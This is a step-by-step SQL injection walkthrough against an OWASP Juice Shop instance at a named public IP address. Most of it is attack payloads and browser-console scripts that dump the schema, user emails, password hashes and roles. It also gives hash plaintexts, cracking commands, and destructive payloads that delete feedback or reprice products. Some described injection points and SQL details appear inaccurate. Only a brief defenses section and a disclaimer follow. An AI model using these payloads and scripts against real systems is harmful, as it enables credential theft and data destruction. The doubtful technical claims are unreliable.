# Complete Database Extraction via SQL Injection - Browser Method

## Extracting the Entire Database Through OWASP Juice Shop

Once you can perform SQL injection on the login page, you can extract the entire database. Here's how to do it directly from your web browser.

---

## Method 1: Using the Search Function (Easiest)

### Step 1: Navigate to Product Search
1. Go to: `http://155.138.197.128:3001/#/search`
2. Or click the magnifying glass icon in the top navigation

### Step 2: Basic Injection Test
In the search box, type:
```
apple')) UNION SELECT sql FROM sqlite_master--
```

This will show you the database schema!

### Step 3: Extract All Table Names
```
apple')) UNION SELECT name FROM sqlite_master WHERE type='table'--
```

**What you'll see:** Product cards displaying table names like:
- `Users`
- `Products`
- `Feedbacks`
- `BasketItems`
- `Challenges`
- `SecurityQuestions`
- `Cards`
- `Addresses`

### Step 4: Get Table Structure
To see the structure of the Users table:
```
apple')) UNION SELECT sql FROM sqlite_master WHERE name='Users'--
```

**Result:** Shows the CREATE TABLE statement with all columns:
```sql
CREATE TABLE Users (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  username VARCHAR(255),
  email VARCHAR(255) UNIQUE,
  password VARCHAR(255),
  role VARCHAR(255),
  deluxeToken VARCHAR(255),
  lastLoginIp VARCHAR(255),
  profileImage VARCHAR(255),
  totpSecret VARCHAR(255),
  isActive BOOLEAN DEFAULT 1
)
```

### Step 5: Extract User Data
To get all users and their passwords:
```
apple')) UNION SELECT email||':'||password FROM Users--
```

**You'll see products with "names" like:**
- `admin@juice-sh.op:0192023a7bbd73250516f069df18b500`
- `jim@juice-sh.op:e541ca7ecf72b8d1286474fc613e5e45`
- `bender@juice-sh.op:0c36e517e3fa95aabf1bbffc6744a4ef`

### Step 6: Extract Specific Columns
Get emails and roles:
```
apple')) UNION SELECT email||' is '||role FROM Users--
```

---

## Method 2: Using the Login Page Error Messages

### Step 1: Trigger Verbose Errors
At login (`http://155.138.197.128:3001/#/login`), use:
```
Email: ' UNION SELECT null,null,null,null,null,null,null,null,null,null,null,null--
Password: x
```

Keep adjusting the number of nulls until no error occurs (this tells you the column count).

### Step 2: Find String Columns
Replace nulls one by one with a test string:
```
' UNION SELECT 'test',null,null,null,null,null,null,null,null,null,null,null--
```

When it works without error, that column accepts strings.

### Step 3: Extract Data
Once you know which columns work:
```
' UNION SELECT email,password,null,null,null,null,null,null,null,null,null,null FROM Users--
```

---

## Method 3: Using Customer Feedback Form

### Step 1: Navigate to Contact Form
Go to: `http://155.138.197.128:3001/#/contact`

### Step 2: Inject in the Rating Parameter
Using browser DevTools, modify the rating parameter:
1. Open DevTools (F12)
2. Go to Network tab
3. Submit feedback normally first
4. Right-click the request → "Edit and Resend"
5. Change the rating value to:
```json
{
  "rating": "5)) UNION SELECT email||':'||password FROM Users--",
  "comment": "test"
}
```

---

## Method 4: Product Reviews Exploitation

### Step 1: Go to Any Product
Click on any juice product to see its details

### Step 2: Check Reviews Section
The review system is also vulnerable. In the review text:
```
Great juice!')) UNION SELECT password FROM Users WHERE email='admin@juice-sh.op'--
```

---

## Complete Database Dump Script (Browser Console)

### Step 1: Open Browser Console
Press F12 → Console tab

### Step 2: Run Extraction Script
```javascript
// Database extraction script for Juice Shop
async function extractDatabase() {
    const baseUrl = 'http://155.138.197.128:3001';
    const results = {};
    
    // Get all tables
    const searchUrl = `${baseUrl}/rest/products/search?q=`;
    const tableQuery = "')) UNION SELECT name FROM sqlite_master WHERE type='table'--";
    
    console.log('Extracting tables...');
    const tablesResponse = await fetch(searchUrl + encodeURIComponent(tableQuery));
    const tablesData = await tablesResponse.json();
    
    console.log('Found tables:', tablesData);
    
    // Extract Users table
    const usersQuery = "')) UNION SELECT email||':'||password||':'||role FROM Users--";
    const usersResponse = await fetch(searchUrl + encodeURIComponent(usersQuery));
    const usersData = await usersResponse.json();
    
    console.log('Users extracted:', usersData);
    
    return usersData;
}

// Run the extraction
extractDatabase().then(data => {
    console.log('=== DATABASE EXTRACTED ===');
    console.log(data);
    
    // Pretty print users
    if(data.data) {
        data.data.forEach(item => {
            if(item.name && item.name.includes(':')) {
                const [email, hash, role] = item.name.split(':');
                console.log(`Email: ${email}`);
                console.log(`Password Hash: ${hash}`);
                console.log(`Role: ${role}`);
                console.log('---');
            }
        });
    }
});
```

### Step 3: View Results
The console will display all extracted data in a formatted way.

---

## Understanding the Password Hashes

The passwords you extract are MD5 hashed. Here are the common ones:

| Email | MD5 Hash | Plain Text |
|-------|----------|------------|
| admin@juice-sh.op | 0192023a7bbd73250516f069df18b500 | admin123 |
| jim@juice-sh.op | e541ca7ecf72b8d1286474fc613e5e45 | ncc-1701 |
| bender@juice-sh.op | 0c36e517e3fa95aabf1bbffc6744a4ef | booze |
| bjoern@owasp.org | 1f0e3dad99908345f7439f8ffabdffc4 | (Unknown) |
| morty@juice-sh.op | b03f4b0ba8b458fa0acdc02cdb953bc8 | (Unknown) |

You can crack these using:
1. Online MD5 databases: https://crackstation.net/
2. John the Ripper: `john --format=raw-md5 hashes.txt`
3. Hashcat: `hashcat -m 0 -a 0 hashes.txt wordlist.txt`

---

## Advanced Extraction Techniques

### 1. Blind Extraction via Search
When results aren't directly visible:

```javascript
// Check if admin password starts with 'a'
"')) UNION SELECT CASE WHEN substr((SELECT password FROM Users WHERE email='admin@juice-sh.op'),1,1)='a' THEN 'apple' ELSE 'orange' END--"
```

### 2. Time-Based Extraction
Using delays to extract data bit by bit:

```sql
')) UNION SELECT CASE WHEN substr((SELECT password FROM Users LIMIT 1),1,1)='a' 
   THEN (SELECT COUNT(*) FROM Products p1, Products p2, Products p3) 
   ELSE 'quick' END--
```

### 3. Extract All Tables Systematically

```javascript
// Complete database dump
const queries = [
    // Users
    "')) UNION SELECT 'USERS:'||email||':'||password||':'||role FROM Users--",
    
    // Products  
    "')) UNION SELECT 'PRODUCTS:'||name||':'||price FROM Products--",
    
    // Feedbacks
    "')) UNION SELECT 'FEEDBACK:'||comment||':'||rating FROM Feedbacks--",
    
    // Challenges
    "')) UNION SELECT 'CHALLENGES:'||name||':'||description FROM Challenges--",
    
    // Security Questions
    "')) UNION SELECT 'QUESTIONS:'||question FROM SecurityQuestions--",
    
    // Baskets
    "')) UNION SELECT 'BASKETS:'||id||':'||coupon FROM Baskets--"
];

async function dumpAll() {
    for(let query of queries) {
        const response = await fetch(`http://155.138.197.128:3001/rest/products/search?q=${encodeURIComponent(query)}`);
        const data = await response.json();
        console.log(data);
    }
}

dumpAll();
```

---

## Useful SQL Injection Payloads for Juice Shop

### Information Gathering
```sql
-- SQLite version
')) UNION SELECT sqlite_version()--

-- Current database user  
')) UNION SELECT 'Current user: ' || current_user--

-- List all tables with their SQL
')) UNION SELECT sql FROM sqlite_master--

-- Count records in each table
')) UNION SELECT 'Users: ' || COUNT(*) FROM Users--
')) UNION SELECT 'Products: ' || COUNT(*) FROM Products--
```

### Data Extraction
```sql
-- Get all admin users
')) UNION SELECT email FROM Users WHERE role='admin'--

-- Get all customer emails
')) UNION SELECT email FROM Users WHERE role='customer'--

-- Get all coupon codes
')) UNION SELECT code||':'||discount FROM Coupons--

-- Get all credit cards (if stored)
')) UNION SELECT cardNum FROM Cards--

-- Get addresses
')) UNION SELECT fullName||':'||address||':'||city FROM Addresses--
```

### Privilege Escalation
```sql
-- Make yourself admin (won't work in search, but shows concept)
'; UPDATE Users SET role='admin' WHERE email='your@email.com'--

-- Delete all feedbacks
'; DELETE FROM Feedbacks--

-- Change product prices
'; UPDATE Products SET price=0.01--
```

---

## Automating with Burp Suite

### Step 1: Configure Proxy
1. Set browser proxy to `127.0.0.1:8080`
2. Open Burp Suite
3. Navigate to Juice Shop

### Step 2: Intercept Search Request
1. Search for "apple"
2. Intercept request in Burp
3. Send to Repeater (Ctrl+R)

### Step 3: Modify and Extract
Change the `q` parameter:
```
q=')) UNION SELECT password FROM Users--
```

### Step 4: Use Intruder for Systematic Extraction
1. Send to Intruder
2. Set payload position: `')) UNION SELECT §column§ FROM Users--`
3. Add column names as payloads
4. Start attack

---

## Defenses Against These Attacks

### 1. Parameterized Queries (Most Important)
```javascript
// Safe query
db.get('SELECT * FROM products WHERE name = ?', [searchTerm]);
```

### 2. Input Validation
```javascript
// Whitelist alphanumeric only
const sanitized = searchTerm.replace(/[^a-zA-Z0-9 ]/g, '');
```

### 3. Escape Special Characters
```javascript
// Escape quotes
const escaped = searchTerm.replace(/'/g, "''");
```

### 4. Least Privilege Database User
```sql
-- Read-only user for searches
GRANT SELECT ON products TO 'search_user'@'localhost';
```

### 5. WAF Rules
```nginx
# Block common SQL injection patterns
if ($args ~* "(union|select|insert|update|delete|drop)") {
    return 403;
}
```

---

## Conclusion

Through the browser alone, you can:
1. **Extract all table names** using the search function
2. **Dump entire tables** including users and passwords
3. **View database schema** to understand structure
4. **Automate extraction** using browser console scripts

The search function at `/rest/products/search?q=` is the most powerful endpoint for database extraction in Juice Shop. With the payload `')) UNION SELECT ... --`, you can extract virtually any data from the database directly in your browser.

**Remember**: This is for educational purposes on your own CTF instance. Never perform these attacks on systems you don't own or have explicit permission to test!